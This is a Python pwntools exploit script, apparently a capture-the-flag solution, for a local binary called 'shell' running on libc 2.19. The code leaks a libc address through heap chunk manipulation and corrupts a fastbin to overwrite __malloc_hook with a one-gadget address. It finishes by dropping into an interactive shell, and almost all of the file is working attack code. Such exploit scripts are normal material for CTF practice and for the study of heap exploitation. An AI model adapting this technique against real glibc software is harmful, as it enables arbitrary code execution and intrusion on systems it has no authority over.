from pwn import *
p=process('./shell')
elf=ELF('libc-2.19.so')
p.readuntil('> ')
def encode(a):
    p.writeline('encode')
    p.readuntil(':')
    p.writeline(str(a))
    p.readuntil('> ')
def decode(a):
    p.writeline('decode')
    p.readuntil(':')
    p.writeline(str(a))
    p.readuntil('> ')
def send(a,b):
    p.writeline('send')
    p.readuntil(':')
    p.writeline(str(a))
    p.readuntil('Content')
    p.writeline(b)
    p.readuntil('> ')
def recv(a):
    p.writeline('recv')
    p.readuntil(':')
    p.writeline(str(a))
    p.readuntil('> ')
#context(log_level='debug')
raw_input("attached")
send(0xa0,'a')
recv(0x60)
send(0xa0,'1234567')
#send(0xa0,'')是有问题的，因为这样也会输入一个0xa，结果就是得到的结果是错误的，即并不是topchunk指针的地址。
encode(16)
recv(0x60)
p.writeline('decode')
p.readuntil(':')
p.writeline('8')
p.readuntil('\n')
libc=u64(p.readuntil('\n')[:-1]+chr(0)*2)-0x3c2760-0x58
success(hex(libc))
raw_input("attached2")
send(0x150,'a'*0x90+p64(0)*3+p64(0x71)+p64(libc+elf.symbols['__malloc_hook']-0x23)+chr(0)*0x60+p64(0x21)+chr(0)*0x18+p64(0x141))
print hex(libc+elf.symbols['__malloc_hook']-0x23)
encode(0x150)
recv(0xa0)
decode(0x150)
re_hook=libc+elf.symbols['__realloc_hook']
mac_hook=libc+elf.symbols['__malloc_hook']
realloc=libc+elf.symbols['__libc_realloc']
print "check"
print "__realloc_hook  "+str(hex(elf.symbols['__realloc_hook']))
print "__malloc_hook   "+str(hex(elf.symbols['__malloc_hook']))
print "__libc_realloc  "+str(hex(elf.symbols['__libc_realloc']))
print "check"
raw_input("fastchunk?")
send(0x60,'b'*(0x13)+p64(libc+0xe9415))#+p64(realloc+6)
raw_input("fastchunk?2")
encode(0x30)
raw_input("fastchunk?3")
recv(0x60)
raw_input("fastchunk?3")
decode(0x30)
raw_input("chufaloudong")
send(0x20,'a')
#sgdb.attach(p)
p.interactive()

